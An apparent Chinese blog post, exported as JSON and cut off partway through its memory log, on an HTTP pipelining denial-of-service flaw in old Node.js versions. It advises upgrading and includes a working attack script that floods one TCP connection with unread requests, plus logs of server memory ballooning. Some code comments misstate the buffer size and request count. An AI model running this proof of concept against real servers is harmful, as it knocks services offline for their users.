{
  "title": "http拒绝管道漏洞",
  "cells": [
    {
      "type": "text",
      "data": "<p style=\"margin: 0px 0px 1em; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">最近在写一些网络安全方面的东西，想到近期Node.js有次重大升级，想顺便提醒下各位将Node.js部署在生产环境下的TX，务必将版本升级到<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">0.8.26</code>和<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">0.10.21</code>。</p><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">我们的测试机器和攻击机器都是2CPU 4G内存的云服务器，系统linux 2.6.8 64bit，node版本0.10.7，网络环境是公司内网。</p><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">我们先启动服务器脚本：</p><pre class=\"prettyprint\" style=\"line-height: 22px; white-space: pre-wrap; padding: 0px 15px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 14px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; margin: 20px -10px; word-break: break-all; word-wrap: break-word; border-width: 1px 0px; border-style: none; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); background-position: initial initial; background-repeat: initial initial;\"><code style=\"font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: inherit;\"><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> http </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">require</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'http'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> buf </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">new</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"typ\" style=\"color: rgb(102, 0, 102);\">Buffer</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1024</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">*</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1024</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//1kb buffer</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\nbuf</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">fill</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'h'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\nhttp</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">createServer</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">request</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> response</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">)</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n    response</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">writeHead</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">200</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'Content-Type'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'text/plain'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">});</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n    response</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">end</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">buf</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}).</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">listen</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">8124</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\nconsole</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">log</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">process</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">memoryUsage</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">());</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\nsetInterval</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(){</span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//per minute memory usage</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n console</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">log</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">process</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">memoryUsage</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">());</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">},</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1000</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">*</span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">60</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">)</span></code></pre><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">这段脚本我们对请求都会响应<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">1KB</code>的buffer字符<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">h</code>，同时每分钟会打印出当前Node.js进程所消耗掉的内存。在攻击服务器上，我们部署如下脚本：</p><pre class=\"prettyprint\" style=\"line-height: 22px; white-space: pre-wrap; padding: 0px 15px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 14px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; margin: 20px -10px; word-break: break-all; word-wrap: break-word; border-width: 1px 0px; border-style: none; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); background-position: initial initial; background-repeat: initial initial;\"><code style=\"font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: inherit;\"><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> net </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">require</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'net'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> attack_str </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'GET / HTTP/1.1\\r\\nHost: 192.168.28.4\\r\\n\\r\\n'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">;</span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//模拟get请求头</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> i </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1000000</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">;</span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//10W次的发送</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">var</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> client </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">=</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> net</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">connect</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">({</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">port</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">8124</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> host</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'192.168.28.4'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">},</span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//28.4是上面那台服务器的ip地址</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">()</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"com\" style=\"color: rgb(136, 0, 0);\">//'connect' listener</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n  </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">while</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">i</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">--){</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n    client</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">write</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">attack_str</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n    </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">});</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\nclient</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">on</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'error'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"kwd\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">e</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">)</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n console</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">.</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">log</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">(</span><span class=\"str\" style=\"color: rgb(0, 136, 0);\">'attack success'</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">);</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">});</span></code></pre><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">我们在一个<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">tcp</code>连接上模拟10W次http请求，<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">get</code>获取这<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">1kb</code>的buffer字符，但是我们并不消费它，不监听<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">client</code>的<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">data</code>事件，当攻击脚本运行结束后，我们看下运行10分钟Node.js服务器打印的内存消耗信息情况：</p><pre class=\"prettyprint\" style=\"line-height: 22px; white-space: pre-wrap; padding: 0px 15px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 14px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; margin: 20px -10px; word-break: break-all; word-wrap: break-word; border-width: 1px 0px; border-style: none; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); background-position: initial initial; background-repeat: initial initial;\"><code style=\"font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: inherit;\"><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">10190848</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">6147328</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">2632432</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">921882624</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">888726688</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">860301136</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189239056</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189251728</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189263768</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189270888</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189278008</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189285096</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span 